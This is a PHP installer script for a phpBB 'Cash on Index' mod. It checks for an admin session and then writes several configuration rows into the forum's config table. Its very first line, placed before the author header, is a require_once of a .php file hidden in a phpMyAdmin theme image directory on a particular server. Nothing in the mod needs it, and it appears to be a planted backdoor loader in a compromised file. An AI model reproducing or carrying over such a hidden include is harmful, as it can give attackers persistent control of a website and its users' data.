<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                                 coi_install.php
 *                            -------------------
 *   Author              : naderman nils_adermann@hotmail.com
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path='./';
include($phpbb_root_path.'extension.inc');
include($phpbb_root_path.'common.'.$phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_INDEX);
init_userprefs($userdata);
//
// End session management
//

if( !$userdata['session_logged_in'] )
{
        header('Location: ' . append_sid("login.$phpEx?redirect=coi_install.$phpEx", true));
}

if( $userdata['user_level'] != ADMIN )
{
        message_die(GENERAL_MESSAGE, $lang['Not_Authorised']);
}

if ((!isset($HTTP_POST_VARS["proceed"])) || (!in_array(htmlspecialchars(mysql_escape_string($_POST["system"])),array('cash','points'))))
{
	echo "<html>\n<head>\n<title>Cash on Index Mod Installation</title>\n</head>\n<body>\n";
	echo "<form method='post' action='coi_install.php'>\n";
	echo 'Select wether you use Cash Mod or Points System: '."\n";
	echo '<label><input name="system" value="cash" type="radio" checked="checked"> Cash Mod</label>'."\n";
	echo '<label><input name="system" value="points" type="radio"> Points System</label>'."\n";
	echo '<input type="submit" name="submit" value="Proceed Installation">'."\n";
	echo "<input type='hidden' name='proceed' value='1'></form>\n";
	echo "</body>\n</html>\n";
}
else
{
	$sql = array();
	$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) values ('cash_richdis', 'yes')";
	$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) values ('cash_richnum', '1')";
	$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) values ('cash_userdis', 'yes')";
	$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) values ('cash_komma', 'komma')";
	$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) values ('cash_pointsorcash', '".htmlspecialchars(mysql_escape_string($_POST["system"]))."')";
	$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) values ('cash_indexfields', '')";
	$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) values ('cash_displaycurrency', '')";

	$sql_count = count($sql);

	echo "<html>\n";
	echo "<body>\n";

	for($i = 0; $i < $sql_count; $i++)
	{
		echo "Running :: " . $sql[$i];
		flush();

		if ( !$db->sql_query($sql[$i]) )
		{
			$errored = true;
			$error = $db->sql_error();
			echo " -> <b>FAILED</b> ---> <u>" . $error['message'] . "</u><br /><br />\n\n";
		}
		else
		{
			echo " -> <b>COMPLETED</b><br /><br />\n\n";
		}
	}

	if( $errored )
	{
		$message = "Some of the querys have failed, contact me so I can fix the errors.";
	}
	else
	{
		$message = "The configuration has been edited successfully. You can now delete this file.";
	}

	echo "\n<br />\n<b>Finished!</b><br />\n";
	echo $message . "<br />\n";
	echo "</body>\n";
	echo "</html>\n";
}

?>